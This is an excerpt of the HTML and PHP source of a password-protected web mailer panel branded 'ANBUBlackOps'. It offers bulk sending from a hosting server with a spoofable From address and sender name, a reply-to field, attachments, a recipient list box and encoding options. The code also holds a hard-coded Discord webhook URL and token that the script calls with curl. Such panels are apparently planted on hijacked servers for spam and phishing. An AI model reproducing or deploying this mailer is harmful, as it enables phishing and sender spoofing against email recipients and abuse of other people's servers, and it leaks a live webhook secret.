...
<html lang="en">
<head>
<title>ANBUBlackOps - Mailer</title>
<meta charset="utf-8">
<link rel="shortcut icon" href="https://i.imgur.com/Q28N1dF.png" type="image/x-icon">
...
<div class="row justify-content-center">
  ...
  <div class="form-group">
   <img src="https://i.imgur.com/Q28N1dF.png" alt="Anbu Black Ops" style="width:200px;height:100px;">
  <label style="color:white;">ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕 :) 𝔼𝕟𝕛𝕠𝕪 𝕦𝕣 𝕕𝕒𝕪 𝕔𝕙𝕚𝕝𝕝𝕚𝕟</label>
...
$url = "https://discord.com/api/webhooks/1214623046703251476/ruJqol78UCxWcQMGb2idF2E_fqA0byKUovwgVhC8hz4Dh922AgsO7Sf8RJwmqQSPwc4W";
$curl = curl_init($url);
...
<head>
  ...
  <style>
    body.fm-login-page{ background-color:#000015;font-size:14px;background-color:#000015;
...
<nav class="navbar navbar-expand-md bg-dark navbar-dark">
   <img src="https://i.imgur.com/Q28N1dF.png" alt="ANBUBlackOps" style="width:60px;height:60px;">
  <blink style="color: red;"class="navbar-brand fontPacificox">ANBUBlackOps</blink>
  ...
  <div class="collapse navbar-collapse" id="collapsibleNavbar">
    <ul class="navbar-nav">
      <li class="nav-item">
        <a style="color: white;" class="btn btn-primary" class="nav-link" href="?mailer">PHP MAILER</a>
        <a style="color: white;" class="btn btn-primary" class="nav-link" href="?basicmailer">BASIC MAILER</a>
       <a style="color: white;" class="btn btn-primary" class="nav-link" href="#letterlist" data-toggle="modal" data-target="#letterlist">LETTER</a>
      </li>
    </ul>
  </div>
  <ul class="navbar-nav">
      <li class="nav-item">
        <a style="color: white;" class="btn btn-danger" class="nav-link" href="?signout" >SIGN OUT</a>
      </li>
  </ul>
</nav>
...
<div class="container">
     <p><i style="color: white;" class="fas fa-coffee">Server Email : <?php echo get_current_user()."@$servername"; ?> </p></i>
</div>
...
<div class="container">
  ...
  <div class="col-6">
     <font style="color: white;" class="fontBungee">From Email</font> 
  ...
  <div class="col-6">
     <font style="color: white;" class="fontBungee">Name</font>
...
<div class="row">
  <div class="col-12">
     <font style="color: white;" class="fontBungee">Subject</font>
  ...
  <div class="row">
  <div class="col-6">
     <font style="color: white;" class="fontBungee">Msg</font>
  ...
  <div class="col-6">
     <font style="color: white;" class="fontBungee">To</font>
  ...
  <div class="container">
    <div class="row">
      <div class="form-group col-lg-6">
        <label style="color: white;" for="senderEmail">Sender Email</label>
        <input type="text" class="form-control  input-sm" id="senderEmail" name="senderEmail">
      </div>
      <div class="form-group col-lg-6 ">
        <label style="color: white;" for="senderEmail">Sender Name</label>
        <input type="text" class="form-control  input-sm" id="senderName" name="senderName">
      </div>
    </div>
    <div class="row"> <span class="form-group col-lg-6"><input style="color: white;" type="file" name="attachment[]" id="attachment" multiple/></span>
      <div class="form-group col-lg-6">
        <label style="color: white;" for="replyTo">Reply-to</label>
    ...
    <div class="row">
      <div class="form-group col-lg-6">
        <label style="color: white;" for="messageLetter">Message Letter</label>
      ...
      <div class="form-group col-lg-6 ">
        <label style="color: white;" for="emailList">Email List</label>
        <textarea name="emailList" id="emailList" class="form-control" rows="10" id="textArea"></textarea>
      </div>

      <div class="form-group col-lg-6">
      <label style="color: white;" for="encoding">Encoding Type</label>
